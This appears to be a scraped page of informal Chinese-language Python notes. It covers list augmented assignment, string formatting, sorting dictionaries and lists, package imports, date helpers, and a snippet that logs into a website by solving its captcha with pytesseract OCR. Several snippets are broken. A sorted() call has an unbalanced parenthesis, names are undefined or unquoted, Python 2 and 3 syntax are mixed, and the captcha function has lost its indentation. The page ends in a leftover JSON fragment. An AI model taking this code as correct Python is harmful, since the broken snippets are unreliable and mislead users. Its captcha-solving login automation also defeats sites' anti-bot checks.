1/4\n\n增强赋值和共享引用：普通+号会生成新的对象，而增强赋值+=会在原处修改\n        L = M = [1, 2]\n        L = L + [3, 4]                      # L = [1, 2, 3, 4], M = [1, 2]\n        L += [3, 4]                         # L = [1, 2, 3, 4], M = [1, 2, 3, 4]\n\n\n \n{x**2 for x in [1, 2, 3, 4]}                         # 集合解析\n\"%(name1)d---%(name2)s\" % {\"name1\":23, \"name2\":\"value2\"}\n\n\"{0}, {1} and {2}\".format('spam', 'ham', 'eggs')            # 基于位置的调用\n    \"{motto} and {pork}\".format(motto = 'spam', pork = 'ham')   # 基于Key的调用\n    D = dict([('name', 'tom'), ('age', 12)])          # {'age': 12, 'name': 'tom'}\n    D = dict(zip(['name', 'age'], ['tom', 12]))\n    'first line' in open('test.txt')   # in测试 返回True或False\n    L = [('b',2),('a',1),('c',3),('d',4)]\n        sorted(L, key=lambda x: x[1]), reverse=True)      # 使用Key参数和reverse参数\n        sorted(L, key=lambda x: (x[0], x[1]))             # 使用key参数进行多条件排序，即如果x[0]相同，则比较x[1]\n        #-- 模块的包导入:使用点号(.)而不是路径(dir1\\dir2)进行导入\n    import dir1.dir2.mod                # d导入包(目录)dir1中的包dir2中的mod模块 此时dir1必须在Python可搜索路径中\n    from dir1.dir2.mod import *         # from语法的包导入\n    from .. import spam                 # 导入当前目录的父目录下的spam模块\n    from subprocess import call\ncall([\"ls\", \"-l\"])\n    字典排序\n    \n    import operator\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0}\nsorted_x = sorted(x.items(), key=operator.itemgetter(1))  dict(sorted_x)就是你想要的结果\n模拟登录有验证码的网站\ndef get_captcha(self, data, captcha_url): \nself._session.post(self.login_url, data=data) \nr = self._session.get(captcha_url) \nwith open('image/captcha.gif', 'wb') as f: \nf.write(r.content) \n\nimage = Image.open('image/captcha.gif') \n\ncaptcha = '' \ntry: \ncaptcha = pytesseract.image_to_string(image, lang='eng') \nexcept Exception: \npass \nif len(captcha) == 0: \nself.get_captcha(data, captcha_url) \nelse: \nprint('captcha:', captcha) \n os.remove('image/captcha.gif') \nreturn captcha \n字典排序\nlist = [ {'student_name': zhangsan, 'student_score': 65}, {'student_name': lisi, 'student_score': 95}, {'student_name': wangwu, 'student_score': 80}, {'student_name': maliu, 'student_score': 75}, {'student_name': zhuqi, 'student_score': 88} ]\nfrom operator import itemgetter \ntop3 = sorted(lst, key=itemgetter('student_score'), reverse=True)[:3] \nprint sorted(list, key=lambda student: student['student_score'])[-3:]\n获取下个周三的日期\ndef get_wednesday_date():\n     today = date.today()  \n     days = 2 - today.weekday()  \n     time_delta = timedelta(days=days) if days > 0 else timedelta(days=7+days) \n     return  today + time_delta\ndef get_wednesday_date(): \nreturn date.today() + timedelta(((2 - date.today().weekday()) + 7) % 7)      \n\n                ", "mainLikeNum": ["0 "], "mainBookmarkNum": "6"}